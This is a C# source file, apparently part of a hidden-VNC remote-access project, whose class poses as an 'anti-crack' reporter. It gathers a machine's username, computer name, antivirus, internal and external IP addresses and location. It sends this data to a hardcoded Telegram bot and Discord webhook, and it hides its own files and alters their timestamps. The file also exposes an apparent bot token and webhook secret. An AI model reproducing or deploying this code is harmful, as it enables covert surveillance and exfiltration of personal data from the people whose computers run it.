using System;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using ShitarusPrivate.HVNC;
using ShitarusPrivate.HVNC.Helpers;
using Telegram.Bot;

namespace ShitarusPrivate.Icarus
{
    internal sealed class DiscordWebHook
    {
        private const int MaxKeylogs = 10;

        private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

        private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

        public static string text;

        public string user;

        public static void SetLatestMessageId(string id)
        {
            try
            {
                File.WriteAllText(LatestMessageIdLocation, id);
                Startup.SetFileCreationDate(LatestMessageIdLocation);
                Startup.HideFile(LatestMessageIdLocation);
            }
            catch (Exception)
            {
                Logging.Log();
            }
        }

        public static string GetLatestMessageId()
        {
            if (!File.Exists(LatestMessageIdLocation))
            {
                return "-1";
            }
            return File.ReadAllText(LatestMessageIdLocation);
        }

        private static string GetMessageId(string response)
        {
            JObject jObject = JObject.Parse(response);
            return jObject["id"].Value<string>();
        }

        public static bool WebhookIsValid(string hook)
        {
            try
            {
                using WebClient webClient = new WebClient();
                string text = webClient.DownloadString(hook);
                return text.StartsWith("{\"type\": 1");
            }
            catch (Exception)
            {
                Logging.Log();
            }
            return false;
        }

        internal static void SendReportT(string tool)
        {
            string token = "5652875771:AAEqS1pFcXmYREkRahghnmYF3oemBuEt9V8";
            string destID = "5559416008";
            string path = Path.Combine(Path.GetTempPath(), "userinfo.txt");
            string text = File.ReadLines(path).First();
            string text2 = "\n\ud83d\udc80 *Icarus AntiCrack System - Report:*\nDate: " + SystemInfo.Datenow + "\nSystem: " + SystemInfo.GetSystemVersion() + "\nUsername: " + SystemInfo.Username + "\nCompName: " + SystemInfo.Compname + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture + "\nAntivirus: " + SystemInfo.GetAntivirus() + "\n\n\ud83d\udce1 *Network:* \nGateway IP: " + SystemInfo.GetDefaultGateway() + "\nInternal IP: " + SystemInfo.GetLocalIp() + "\nExternal IP: " + SystemInfo.GetPublicIp() + "\n" + SystemInfo.GetLocation() + "\n\nSuspicius User -->" + text + "\nTools Detected: " + tool + "\nBan Reason: " + tool;
            try
            {
                using defender defender = new defender();
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                foreach (ManagementObject item in managementObjectSearcher.Get())
                {
                    item["Caption"].ToString();
                    defender.ProfilePicture = "https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png";
                    defender.UserName = "ICARUS";
                    if (File.Exists(path))
                    {
                        sendMessage(token, destID, text2 + Environment.NewLine);
                       // Login.trance.ban(tool);
                    }
                }
            }
            catch
            {
            }
        }

        internal static void SendReport(string tool)
        {
            string text = "https://discord.com/api/webhooks/1014922643390083133/Ix87W1-9_SpBknLkk7WcJLAfKdSOzRN0Lelk1ADNc2eGEvepYwCGpjPDDBurWDyL50uB";
            string path = Path.Combine(Path.GetTempPath(), "userinfo.txt");
            string text2 = File.ReadLines(path).First();
            string text3 = "```\n\ud83d\udc80 *Icarus AntiCrack System - Report:*\nDate: " + SystemInfo.Datenow + "\nSystem: " + SystemInfo.GetSystemVersion() + "\nUsername: " + SystemInfo.Username + "\nCompName: " + SystemInfo.Compname + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture + "\nAntivirus: " + SystemInfo.GetAntivirus() + "\n\n\ud83d\udce1 *Network:* \nGateway IP: " + SystemInfo.GetDefaultGateway() + "\nInternal IP: " + SystemInfo.GetLocalIp() + "\nExternal IP: " + SystemInfo.GetPublicIp() + "\n" + SystemInfo.GetLocation() + "\n\nSuspicius User -->" + text2 + "\nTools Detected: " + tool + "\nBan Reason: " + tool + "```";
            string latestMessageId = GetLatestMessageId();
            if (latestMessageId != "-1")
            {
                EditMessage(text3, latestMessageId, text);
            }
            else
            {
                SetLatestMessageId(SendMessage(text3, text));
            }
            try
            {
                using defender defender = new defender();
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                foreach (ManagementObject item in managementObjectSearcher.Get())
                {
                    item["Caption"].ToString();
                    defender.ProfilePicture = "https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png";
                    defender.UserName = "ICARUS";
                    defender.WebHook = text;
                    if (File.Exists(path))
                    {
                        defender.SendMessage("```" + text3 + Environment.NewLine + "```");
                      //  Login.trance.ban(tool);
                    }
                    else
                    {
                        defender.SendMessage("```" + text3 + Environment.NewLine + "```");
                      //  Login.trance.ban(tool);
                    }
                }
            }
            catch
            {
            }
        }

        public static string SendMessage(string text, string hook)
        {
            try
            {
                NameValueCollection nameValueCollection = new NameValueCollection();
                using WebClient webClient = new WebClient();
                nameValueCollection.Add("username", "Icarus");
                nameValueCollection.Add("avatar_url", "https://i.ibb.co/kDLd65M/dcicon.png");
                nameValueCollection.Add("content", text);
                byte[] bytes = webClient.UploadValues(hook + "?wait=true", nameValueCollection);
                return GetMessageId(Encoding.UTF8.GetString(bytes));
            }
            catch (Exception)
            {
                Logging.Log();
            }
            return "0";
        }

        public static void EditMessage(string text, string id, string hook)
        {
            try
            {
                NameValueCollection nameValueCollection = new NameValueCollection();
                using WebClient webClient = new WebClient();
                nameValueCollection.Add("username", "Icarus");
                nameValueCollection.Add("avatar_url", "https://i.ibb.co/kDLd65M/dcicon.png");
                nameValueCollection.Add("content", text);
                webClient.UploadValues(hook + "/messages/" + id, "PATCH", nameValueCollection);
            }
            catch
            {
            }
        }

        public static string Unfo()
        {
            string path = Path.Combine(Path.GetTempPath(), "userinfo.txt");
            using (StreamReader streamReader = File.OpenText(path))
            {
                text = streamReader.ReadToEnd();
                Console.WriteLine(text);
            }
            return text;
        }

        public static async Task sendMessage(string token, string destID, string text)
        {
            try
            {
                TelegramBotClient botClient = new TelegramBotClient(token);
                await botClient.SendTextMessageAsync(destID, text);
            }
            catch (Exception)
            {
                Console.WriteLine("err");
            }
        }

        internal static void Finish(string file)
        {
            Path.GetTempPath();
            Thread.Sleep(15000);
            File.Delete(file);
            Environment.Exit(0);
        }
    }
}
